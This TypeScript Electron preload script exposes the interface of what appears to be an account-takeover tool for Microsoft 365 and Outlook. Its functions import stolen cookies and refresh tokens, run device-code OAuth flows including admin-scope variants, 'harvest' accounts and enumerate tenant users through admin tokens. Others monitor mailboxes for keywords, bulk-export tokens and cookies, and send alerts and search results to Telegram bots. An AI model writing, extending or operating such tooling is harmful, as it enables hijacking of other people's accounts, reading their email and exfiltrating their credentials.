import { contextBridge, ipcRenderer } from 'electron';

console.log('[Preload] Preload script loaded');

contextBridge.exposeInMainWorld('electron', {
  platform: process.platform,
  versions: {
    node: process.versions.node,
    chrome: process.versions.chrome,
    electron: process.versions.electron,
  },

  // Secure storage
  store: {
    get: (key: string) => ipcRenderer.invoke('store:get', key),
    set: (key: string, value: any) => ipcRenderer.invoke('store:set', key, value),
    delete: (key: string) => ipcRenderer.invoke('store:delete', key),
  },

  // State persistence
  state: {
    get: () => ipcRenderer.invoke('state:get'),
    set: (state: any) => ipcRenderer.invoke('state:set', state),
    update: (updates: any) => ipcRenderer.invoke('state:update', updates),
  },

  // Encryption/decryption using safeStorage (main process only)
  safeStorage: {
    encrypt: (plaintext: string) => ipcRenderer.invoke('safeStorage:encrypt', plaintext),
    decrypt: (ciphertext: string) => ipcRenderer.invoke('safeStorage:decrypt', ciphertext),
  },

  // Panel API requests (proxied through main to avoid CORS issues)
  api: {
    request: (options: {
      url: string;
      method?: string;
      headers?: Record<string, string>;
      body?: any;
    }) => ipcRenderer.invoke('api:request', options),
  },

  // Panel management
  panels: {
    testConnection: (url: string, username: string, password: string) =>
      ipcRenderer.invoke('panel:testConnection', url, username, password),
    save: (name: string, url: string, username: string, password: string) =>
      ipcRenderer.invoke('panel:save', name, url, username, password),
    connect: (panelId: string) => ipcRenderer.invoke('panel:connect', panelId),
    disconnect: (panelId: string) => ipcRenderer.invoke('panel:disconnect', panelId),
    delete: (panelId: string) => ipcRenderer.invoke('panel:delete', panelId),
    detachAccounts: (panelId: string) => ipcRenderer.invoke('panel:detachAccounts', panelId),
    previewAccounts: (panelId: string) => ipcRenderer.invoke('panel:previewAccounts', panelId),
  },

  // Account management
  accounts: {
    addViaCredentials: (email: string, password: string) =>
      ipcRenderer.invoke('account:addViaCredentials', email, password),
    addViaCookies: (email: string, cookies: string) =>
      ipcRenderer.invoke('account:addViaCookies', email, cookies),
    addViaToken: (email: string, clientId: string, authorityEndpoint: string, refreshToken: string, scopeType?: string) =>
      ipcRenderer.invoke('account:addViaToken', email, clientId, authorityEndpoint, refreshToken, scopeType),
    delete: (accountId: string) => ipcRenderer.invoke('account:delete', accountId),
    deleteBulk: (ids: string[]) => ipcRenderer.invoke('account:deleteBulk', ids),
    exportJSON: (accountId: string) => ipcRenderer.invoke('account:exportJSON', accountId),
    /** Token account → exported cookie formats (Netscape + custom text formats). */
    exportOwaCookies: (accountId: string) => ipcRenderer.invoke('account:exportOwaCookies', accountId),
    /** Token account → persisted cookie snapshot + clipboard Cookie header. */
    snapshotOwaCookies: (accountId: string) => ipcRenderer.invoke('account:snapshotOwaCookies', accountId),
    /** Re-apply the stored cookie paste to the OWA partition. */
    reapplyCookies: (accountId: string) => ipcRenderer.invoke('account:reapplyCookies', accountId),
    /** Replace primary auth on a token account after re-authentication. */
    replaceTokenAuth: (
      accountId: string,
      refreshToken: string,
      authorityEndpoint?: string,
      clientId?: string,
      resource?: string,
      scopeType?: string
    ) =>
      ipcRenderer.invoke(
        'account:replaceTokenAuth',
        accountId,
        refreshToken,
        authorityEndpoint,
        clientId,
        resource,
        scopeType
      ),
    exportBulkCSV: (ids: string[]) => ipcRenderer.invoke('account:exportBulkCSV', ids),
    testLogin: (email: string, password: string) =>
      ipcRenderer.invoke('account:testLogin', email, password),
  },

  // Token management
  tokens: {
    refresh: (accountId: string) => ipcRenderer.invoke('token:refresh', accountId),
    /** Background refresh scheduler status snapshot. */
    refreshStatus: () => ipcRenderer.invoke('tokens:refreshStatus'),
    /** 'Run now' — refreshes every active token-typed account immediately. */
    refreshNow: () => ipcRenderer.invoke('tokens:refreshNow'),
    refreshBulk: (ids: string[]) => ipcRenderer.invoke('token:refreshBulk', ids),
    exportCSV: () => ipcRenderer.invoke('tokens:exportCSV'),
    exportJSON: () => ipcRenderer.invoke('tokens:exportJSON'),
    exportJSONData: (accountIds?: string[]) => ipcRenderer.invoke('tokens:exportJSONData', accountIds),
    importJSON: (filePath: string) => ipcRenderer.invoke('tokens:importJSON', filePath),
    importJSONDialog: () => ipcRenderer.invoke('tokens:importJSONDialog'),
  },

  // Browser
  browser: {
    open: (url: string) => ipcRenderer.invoke('browser:open', url),
    openPopup: (url: string) => ipcRenderer.invoke('browser:openPopup', url),
    openLoginPage: (url: string) => ipcRenderer.invoke('browser:openLoginPage', url),
  },

  files: {
    saveTextWithDialog: (opts: { defaultFilename: string; content: string; filters?: { name: string; extensions: string[] }[] }) =>
      ipcRenderer.invoke('files:saveTextWithDialog', opts),
  },

  // Monitoring
  monitor: {
    add: (accountId: string, folders: string[], keywords: string[]) =>
      ipcRenderer.invoke('monitor:add', accountId, folders, keywords),
    pause: (listenerId: string) => ipcRenderer.invoke('monitor:pause', listenerId),
    delete: (listenerId: string) => ipcRenderer.invoke('monitor:delete', listenerId),
    pauseAll: () => ipcRenderer.invoke('monitor:pauseAll'),
    resumeAll: () => ipcRenderer.invoke('monitor:resumeAll'),
  },

  // Alerts
  alerts: {
    markRead: (alertId: string) => ipcRenderer.invoke('alert:markRead', alertId),
    dismiss: (alertId: string) => ipcRenderer.invoke('alert:dismiss', alertId),
    markAllRead: () => ipcRenderer.invoke('alert:markAllRead'),
  },

  // Admin harvest
  admin: {
    harvestAccounts: (adminId: string, emails: string[]) =>
      ipcRenderer.invoke('admin:harvestAccounts', adminId, emails),
  },

  // Search
  search: {
    runQueue: (queue: any[], filters: any) => ipcRenderer.invoke('search:runQueue', queue, filters),
    results: () => ipcRenderer.invoke('search:results'),
  },

  // Tags
  tags: {
    create: (name: string, color: string) => ipcRenderer.invoke('tags:create', name, color),
    update: (tagId: string, name: string, color: string) =>
      ipcRenderer.invoke('tags:update', tagId, name, color),
    delete: (tagId: string) => ipcRenderer.invoke('tags:delete', tagId),
  },

  // UI
  ui: {
    openTagEditor: (accountId: string) => ipcRenderer.invoke('ui:openTagEditor', accountId),
    openBulkTagEditor: (ids: string[]) => ipcRenderer.invoke('ui:openBulkTagEditor', ids),
  },

  // Settings
  settings: {
    save: (allSettings: any) => ipcRenderer.invoke('settings:save', allSettings),
    clearActivity: () => ipcRenderer.invoke('dashboard:clearActivity'),
  },

  // Updater
  updater: {
    check: () => ipcRenderer.invoke('updater:check'),
  },

  // Microsoft Graph OAuth (main process, no CORS)
  microsoft: {
    getAccessToken: (clientId: string, authority: string, refreshToken: string, scopeType?: string, resource?: string) =>
      ipcRenderer.invoke('microsoft:getAccessToken', clientId, authority, refreshToken, scopeType, resource),
    /** Delegates to main `oauth:deviceCode` (EWS-scoped Office client). */
    startDeviceCode: (clientId?: string, authority?: string) =>
      ipcRenderer.invoke('oauth:deviceCode', clientId, authority),
    /** Delegates to main `oauth:pollToken` — second arg is client id, not poll interval. */
    pollDeviceCode: (deviceCode: string, clientId?: string, authority?: string) =>
      ipcRenderer.invoke('oauth:pollToken', deviceCode, clientId, authority),
  },

  // Actions (legacy, keep for compatibility)
  actions: {
    captureCookies: (url: string) => ipcRenderer.invoke('cookies:capture', url),
    exchangeCookiesForToken: (cookies: string, email?: string, opts?: Record<string, unknown>) =>
      ipcRenderer.invoke('cookies:exchangeToken', cookies, email, opts),
    adminHarvest: (accountId: string) => ipcRenderer.invoke('admin:harvest', accountId),
    openMailbox: (accountId: string) => ipcRenderer.invoke('mailbox:open', accountId),
    openPanelAdmin: (accountId: string) => ipcRenderer.invoke('panel:openAdmin', accountId),
    /** Open a path under the panel origin (e.g. admin/connectors) with panel Bearer token. */
    openPanelPath: (accountId: string, relativePath: string) =>
      ipcRenderer.invoke('panel:openPath', accountId, relativePath),
    openOutlook: (
      accountId: string,
      options?: { mode?: 'owa' | 'exchangeAdmin'; authPreference?: 'token' | 'cookie' }
    ) => ipcRenderer.invoke('mailbox:openOutlook', accountId, options ?? {}),
    /** Official OAuth authorize URL in system browser (login_hint + tenant from Settings). */

    getOpenOutlookWindows: () => ipcRenderer.invoke('mailbox:getOpenOutlookWindows'),    telegramSendAlert: (bot: string, message: string) => ipcRenderer.invoke('telegram:sendAlert', bot, message),
    telegramSendSearchResults: (bot: string, results: any[]) => ipcRenderer.invoke('telegram:sendSearchResults', bot, results),
    telegramAccountsNotify: (email: string, via: string) => ipcRenderer.invoke('telegram:accountsNotify', email, via),
    telegramTest: (bot: string) => ipcRenderer.invoke('telegram:test', bot),
    importTokens: (filePath: string) => ipcRenderer.invoke('tokens:importJSON', filePath),
    exportTokens: (filePath: string) => ipcRenderer.invoke('tokens:exportJSON', filePath),
    exportTokensWithDialog: () => ipcRenderer.invoke('tokens:exportJSONDialog'),
    clearActivity: () => ipcRenderer.invoke('activity:clear'),
    testTokenExchange: (accountId: string) => ipcRenderer.invoke('test:tokenExchange', accountId),
    testDeviceCodeHighHopes: () => ipcRenderer.invoke('test:deviceCodeHighHopes'),
    addV2Token: (accountId: string, refreshToken: string, authorityEndpoint?: string, clientId?: string, resource?: string, scopeType?: string) => ipcRenderer.invoke('account:addV2Token', accountId, refreshToken, authorityEndpoint, clientId, resource, scopeType),
    removeV2Token: (accountId: string) => ipcRenderer.invoke('account:removeV2Token', accountId),
    getOutlookDebugLogs: () => ipcRenderer.invoke('debug:getOutlookLogs'),
    copyOutlookDebugLogs: () => ipcRenderer.invoke('debug:copyOutlookLogs'),
  },

  // OAuth device code flow (direct, no panel)
  oauth: {
    deviceCode: (clientId?: string, authority?: string) => ipcRenderer.invoke('oauth:deviceCode', clientId, authority),
    pollToken: (deviceCode: string, clientId?: string, authority?: string) => ipcRenderer.invoke('oauth:pollToken', deviceCode, clientId, authority),
    deviceCodeHighHopes: () => ipcRenderer.invoke('oauth:deviceCodeHighHopes'),
    /** Same as deviceCode() but requests Graph admin scopes (Directory.Read.All + User.Read.All). */
    deviceCodeAdminScope: (clientId?: string, authority?: string) =>
      ipcRenderer.invoke('oauth:deviceCodeAdminScope', clientId, authority),
  },

  // Microsoft Graph admin enumeration (opt-in, requires admin-scope token).
  graphAdmin: {
    listUsers: (adminRefreshToken: string, authority?: string, clientId?: string) =>
      ipcRenderer.invoke('graphAdmin:listUsers', adminRefreshToken, authority, clientId),
  },
});